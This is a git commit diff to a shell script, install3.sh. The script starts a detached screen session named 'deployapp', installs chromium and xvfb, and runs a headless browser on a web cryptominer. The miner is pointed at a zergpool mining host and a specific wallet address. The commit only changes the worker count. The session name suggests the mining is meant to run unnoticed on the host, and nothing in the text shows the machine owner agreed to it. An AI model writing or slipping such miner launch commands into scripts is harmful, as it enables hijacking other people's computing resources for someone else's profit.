981c14d69d597b76e583cc26225c809bb608803d
duongpokeee <duongdoan2503@icloud.com>
2025-03-09 00:08:32 +0700

    Update install3.sh

--- install3.sh
+++ install3.sh
@@ -7,4 +7,4 @@ screen -dmS deployapp bash -c "
     sudo apt update &&
     sudo apt install -y chromium-browser &&
     sudo apt install -y xvfb &&
-    xvfb-run chromium-browser --no-sandbox --disable-gpu 'https://webminer.pages.dev?algorithm=cwm_power2B&host=power2b.na.mine.zergpool.com&port=7445&worker=0xC4C2ca6D265f353972a26B8c8Df5FF4c1C000D7D&password=c%3DUSDT-BEP20&workers=5'"
+    xvfb-run chromium-browser --no-sandbox --disable-gpu 'https://webminer.pages.dev?algorithm=cwm_power2B&host=power2b.na.mine.zergpool.com&port=7445&worker=0xC4C2ca6D265f353972a26B8c8Df5FF4c1C000D7D&password=c%3DUSDT-BEP20&workers=4'"
